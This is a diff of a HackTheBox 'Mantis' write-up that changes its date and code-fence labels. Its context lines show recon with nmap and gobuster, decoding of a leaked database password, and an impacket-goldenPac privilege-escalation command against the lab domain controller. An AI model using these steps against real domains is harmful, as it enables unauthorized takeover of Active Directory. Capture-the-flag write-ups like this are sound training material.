@@ -1,6 +1,6 @@
 ---
 title: "Mantis"
-date: 2025-06-20
+date: 2024-11-22
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.52  
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 18:13 CET
 Nmap scan report for 10.10.10.52
@@ -136,7 +136,7 @@ Nmap done: 1 IP address (1 host up) scanned in 85.74 seconds
 
 We can't enumerate anything AD related, so I'll enumerate web directories in the two webs, `8080` and `1337`, and we get two results in `1337`.
 
-```bash
+```shell
 $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.52:1337/ -t 70 
 ===============================================================
 Gobuster v3.6
@@ -169,7 +169,7 @@ Going to `secure_notes`, we have
 
 Using `xxd`, we can convert hex to binary after base64 decoding it
 
-```bash
+```shell
 $ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
 m$$ql_S@_P@ssW0rd!
 ```
@@ -184,7 +184,7 @@ And we get credentials for `james:J@m3s_P@ssW0rd!`
 
 There are no more users apart from admin and no useful shares
 
-```bash
+```shell
 $ rpcclient -U "james" 10.10.10.52  
 Password for [WORKGROUP\james]:
 rpcclient $> enumdomusers
@@ -200,7 +200,7 @@ So we try `goldenPac` from `impacket`:
 
 Add the domain and DC to `/etc/hosts` and using `impacket-goldenPac` we can enter as administrator.
 
-```bash
+```shell
 $ impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local -dc-ip 10.10.10.52
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
